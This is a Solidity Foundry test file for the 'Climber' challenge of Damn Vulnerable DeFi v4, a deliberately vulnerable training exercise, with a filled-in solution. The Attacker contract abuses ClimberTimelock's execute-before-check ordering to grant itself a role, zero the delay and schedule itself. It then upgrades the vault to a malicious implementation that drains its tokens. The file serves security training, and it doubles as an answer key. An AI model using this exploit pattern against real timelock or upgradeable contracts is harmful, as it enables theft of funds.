// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

import {AccessControl} from "@openzeppelin/contracts/access/AccessControl.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";

contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public checkSolvedByPlayer {
        Attacker attacker = new Attacker(timelock, vault, token, recovery);
        attacker.attack();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}

contract Attacker {
    ClimberTimelock private timelock;
    ClimberVault private vault;
    DamnValuableToken private token;
    address private recovery;

    address private newImplementation;

    constructor(ClimberTimelock _timelock, ClimberVault _vault, DamnValuableToken _token, address _recovery) {
        timelock = _timelock;
        vault = _vault;
        token = _token;
        recovery = _recovery;

        newImplementation = address(new AttackerClimberVault());
    }

    function attack() external {
        // ClimberTimelock::execute() allows arbitrary invocation by any caller.
        //
        // The function calls functionCallWithValue() on target contracts before
        // verifying the operation's state through getOperationState(id).
        //
        // This misordering allows an attacker to execute arbitrary operations
        // without the operation being marked as ready, potentially escalating
        // privileges or executing unauthorized actions.

        // Review the function getPayload() for a description of each task
        (address[] memory targets, uint256[] memory values, bytes[] memory dataElements) = getPayload();
        timelock.execute(targets, values, dataElements, 0x0);
    }

    // ClimberTimelock::execute will call it.
    function invokeTimelockSchedule() external {
        (address[] memory targets, uint256[] memory values, bytes[] memory dataElements) = getPayload();
        timelock.schedule(targets, values, dataElements, 0x0);
    }

    function getPayload() private view returns (address[] memory, uint256[] memory, bytes[] memory) {
        uint8 numberOfCalls = 4;
        address[] memory targets = new address[](numberOfCalls);
        uint256[] memory values = new uint256[](numberOfCalls);
        bytes[] memory dataElements = new bytes[](numberOfCalls);
        uint8 i; // This variable facilitates the ordering of tasks.

        // We need to grant ourselves the PROPOSER_ROLE to be able to use
        // schedule(). Also, if the operation is not scheduled, the execution
        // will fail. As the caller of the function is the ClimberTimelock
        // contract, we can just use grantRole().
        i = 0;
        targets[i] = address(timelock);
        values[i] = 0;
        dataElements[i] = abi.encodeWithSelector(
            AccessControl.grantRole.selector, PROPOSER_ROLE, address(this)
        );

        // Next, we override the delay for execution readiness by setting the
        // delay to 0. This modifies the operation's readyAtTimestamp to the
        // current timestamp.
        i = 1;
        targets[i] = address(timelock);
        values[i] = 0;
        dataElements[i] = abi.encodeWithSelector(
            ClimberTimelock.updateDelay.selector, 0
        );

        // Then, we schedule the task. Both execute and schedule use targets,
        // values, dataElements, and salt as variables, and these values need
        // to be equal. We cannot just pass a direct call to schedule() with
        // these parameters (circular dependency). To solve that, we issue the
        // call to a proxy function invokeTimelockSchedule() in our attacker
        // contract, which uses this getPayload() function.
        i = 2;
        targets[i] = address(this);
        values[i] = 0;
        dataElements[i] = abi.encodeWithSelector(
            this.invokeTimelockSchedule.selector
        );

        // Finally, we sweep the vault. We create a UUPSUpgradeable contract,
        // whose initialize() function sends the vault contract's token funds
        // to our recovery function, completing the challenge.
        i = 3;
        targets[i] = address(vault);
        values[i] = 0;
        dataElements[i] = abi.encodeWithSelector(
            UUPSUpgradeable.upgradeToAndCall.selector,
            newImplementation,
            abi.encodeWithSelector(
                AttackerClimberVault.initialize.selector, address(token),
                recovery
            )
        );


        return (targets, values, dataElements);
    }
}

// Needs to inherit from UUPSUpgradeable to avoid ERC1967InvalidImplementation error.
contract AttackerClimberVault is UUPSUpgradeable {
    function initialize(address token, address recovery) external {
        SafeTransferLib.safeTransfer(token, recovery, IERC20(token).balanceOf(address(this)));
    }

    // Comply with interface.
    function _authorizeUpgrade(address newImplementation) internal override {}
}
